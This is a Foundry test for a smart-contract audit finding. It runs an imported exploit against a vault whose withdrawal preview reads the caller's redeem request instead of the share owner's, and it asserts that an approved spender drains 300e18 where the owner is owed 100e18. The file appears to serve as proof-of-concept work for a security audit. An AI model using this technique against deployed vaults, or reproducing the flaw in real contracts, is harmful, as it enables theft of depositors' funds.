// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {
    Exploit,
    HyperEvmVault,
    MiniToken
} from "./61469-h-01-flawed-withdrawal-logic-when-caller-differs-from-share.sol";

// Blueberry HyperEvmVault H-01 (finding 61469): previewWithdraw/previewRedeem read
// $.redeemRequests[msg.sender] (the caller) instead of the share `owner`. When an
// approved spender redeems the owner's shares, the payout is computed on the
// CALLER's request. Attacker (3x request) redeems the owner's 100e18-worth shares
// and receives 300e18, draining honest depositors' pooled funds.
contract Finding61469Test is Test {
    function test_exploit_callerRequestConversion_drainsPool() public {
        Exploit e = new Exploit();
        e.run();

        emit log_named_uint("owner fair assets", e.ownerFairAssets());
        emit log_named_uint("assets received by attacker", e.assetsReceived());
        emit log_named_uint("pool drained", e.poolDrained());
        emit log_named_uint("net theft", e.netTheft());

        assertEq(e.ownerFairAssets(), 100 ether, "owner's request worth 100e18");
        assertEq(e.assetsReceived(), 300 ether, "attacker paid out at its own (caller) 3x rate");
        assertEq(e.assetsReceived(), 3 * e.ownerFairAssets(), "payout used caller's rate, not owner's");
        assertEq(e.poolDrained(), 300 ether, "vault drained by the full payout");
        assertEq(e.netTheft(), 200 ether, "200e18 stolen beyond the owner's fair value");
        assertGt(e.netTheft(), 0, "net theft is positive");
    }
}
